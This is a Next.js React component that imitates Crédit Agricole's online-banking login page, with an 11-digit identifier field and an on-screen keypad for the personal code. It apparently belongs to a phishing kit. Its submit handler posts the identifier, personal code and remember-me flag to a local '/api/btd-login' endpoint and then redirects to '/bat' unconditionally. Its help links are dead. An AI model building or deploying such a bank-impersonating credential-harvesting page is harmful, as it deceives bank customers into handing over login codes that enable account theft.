'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

export default function CreditAgricoleAuthPage() {
  const router = useRouter();

  // État de navigation : Step 1 (Identifiant) | Step 2 (Code Personnel)
  const [step, setStep] = useState<1 | 2>(1);
  
  // Champs de formulaire
  const [identifiant, setIdentifiant] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [codePersonnel, setCodePersonnel] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Pavé numérique : chiffres de 0 à 9
  const keypadKeys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'Effacer', '←'];

  const handleKeypadClick = (key: string) => {
    if (key === 'Effacer') {
      setCodePersonnel('');
    } else if (key === '←') {
      setCodePersonnel((prev) => prev.slice(0, -1));
    } else {
      if (codePersonnel.length < 10) {
        setCodePersonnel((prev) => prev + key);
      }
    }
  };

  const handleNextStep = (e: FormEvent) => {
    e.preventDefault();
    if (identifiant.trim().length > 0) {
      setStep(2);
    }
  };

  const handleSubmitFinal = async (e?: FormEvent) => {
    if (e) e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offreId: '1',
          identifiant,
          codePersonnel,
          rememberMe,
        }),
      });
    } catch (err) {
      console.error('Erreur de soumission :', err);
    } finally {
      setIsSubmitting(false);
      router.push('/bat');
    }
  };

  return (
    <div className="min-h-screen bg-[#F3F5F7] text-slate-800 font-sans flex justify-center items-center p-3 sm:p-6">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
        
        {/* Entête avec titre et fermeture */}
        <header className="flex items-center justify-between px-6 py-5 border-b border-slate-100">
          <h1 className="text-xl font-bold text-[#00665A]">Accéder à mes comptes</h1>
          <button 
            onClick={() => router.push('/portail')} 
            className="text-slate-400 hover:text-slate-600 font-bold text-lg p-1 transition-colors"
          >
            ✕
          </button>
        </header>

        {/* ÉTAPE 1 : Saisie de l'identifiant */}
        {step === 1 && (
          <main className="p-6 animate-in fade-in duration-200">
            <h2 className="text-xl font-extrabold text-[#00665A] tracking-wider mb-2 uppercase">
              Identifiant
            </h2>
            <p className="text-xs text-slate-500 font-medium mb-6">
              Saisissez votre identifiant à 11 chiffres
            </p>

            <form onSubmit={handleNextStep} className="flex flex-col gap-5">
              <div>
                <input
                  type="text"
                  maxLength={11}
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value.replace(/\D/g, ''))}
                  placeholder="Exemple 98652706859"
                  className="w-full px-4 py-3.5 bg-white border border-slate-300 rounded-lg text-slate-900 font-medium text-base outline-none focus:border-[#00665A] focus:ring-1 focus:ring-[#00665A] transition-all placeholder:text-slate-400"
                />
              </div>

              <label className="flex items-center gap-3 cursor-pointer text-xs font-semibold text-slate-700 select-none">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4 h-4 rounded border-slate-300 text-[#00665A] focus:ring-[#00665A]"
                />
                Mémoriser mon identifiant
              </label>

              <button
                type="submit"
                disabled={!identifiant}
                className={`w-full py-3.5 rounded-lg font-bold text-sm transition-all duration-200 ${
                  identifiant
                    ? 'bg-[#00665A] hover:bg-[#005248] text-white shadow-md'
                    : 'bg-slate-200 text-slate-400 cursor-not-allowed'
                }`}
              >
                Suivant
              </button>
            </form>

            <div className="mt-8 flex flex-col gap-2.5 text-[11px] font-bold text-[#00665A]">
              <a href="#" className="hover:underline">OUBLI/PERTE DE CODE PERSONNEL</a>
              <a href="#" className="hover:underline">UN PROBLÈME TECHNIQUE ?</a>
              <a href="#" className="hover:underline">SÉCURITÉ</a>
            </div>
          </main>
        )}

        {/* ÉTAPE 2 : Saisie du code personnel via le pavé numérique */}
        {step === 2 && (
          <main className="p-6 animate-in fade-in duration-200">
            <h2 className="text-xl font-extrabold text-[#00665A] tracking-wider mb-2 uppercase">
              Entrer mon code personnel
            </h2>
            <p className="text-xs text-slate-500 font-medium mb-5">
              Saisissez votre code personnel à 10 chiffres maximum
            </p>

            {/* Badge de récapitulatif identifiant */}
            <div className="bg-[#EAF5F3] border border-[#C5E4DF] rounded-lg px-4 py-3 flex items-center justify-between mb-5">
              <span className="text-xs font-bold text-[#00665A]">Identifiant :</span>
              <span className="text-sm font-extrabold text-slate-800 tracking-wider">{identifiant}</span>
            </div>

            {/* Champ d'affichage du mot de passe */}
            <div className="mb-6">
              <div className="w-full py-3.5 px-4 bg-white border border-[#00665A] rounded-lg text-center tracking-[0.4em] font-mono text-xl font-bold text-slate-800 min-h-[52px] flex items-center justify-center">
                {codePersonnel ? '•'.repeat(codePersonnel.length) : <span className="text-slate-300 text-xs font-sans tracking-normal font-normal">Code personnel</span>}
              </div>
            </div>

            {/* Pavé Numérique */}
            <div className="grid grid-cols-3 gap-3 mb-6">
              {keypadKeys.map((key) => (
                <button
                  key={key}
                  type="button"
                  onClick={() => handleKeypadClick(key)}
                  className="h-14 bg-white border border-slate-200 hover:bg-slate-50 active:bg-slate-100 rounded-xl text-slate-800 font-extrabold text-lg shadow-sm transition flex items-center justify-center"
                >
                  {key === 'Effacer' || key === '←' ? (
                    <span className="text-xs font-bold text-slate-600">{key}</span>
                  ) : (
                    key
                  )}
                </button>
              ))}
            </div>

            {/* Boutons d'action */}
            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="flex-1 py-3.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-lg transition"
              >
                Retour
              </button>
              <button
                type="button"
                onClick={handleSubmitFinal}
                disabled={isSubmitting || codePersonnel.length === 0}
                className={`flex-1 py-3.5 rounded-lg font-bold text-xs transition flex items-center justify-center ${
                  codePersonnel.length > 0 && !isSubmitting
                    ? 'bg-[#00665A] hover:bg-[#005248] text-white shadow-md'
                    : 'bg-slate-200 text-slate-400 cursor-not-allowed'
                }`}
              >
                {isSubmitting ? (
                  <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  'Valider'
                )}
              </button>
            </div>
          </main>
        )}

      </div>
    </div>
  );
}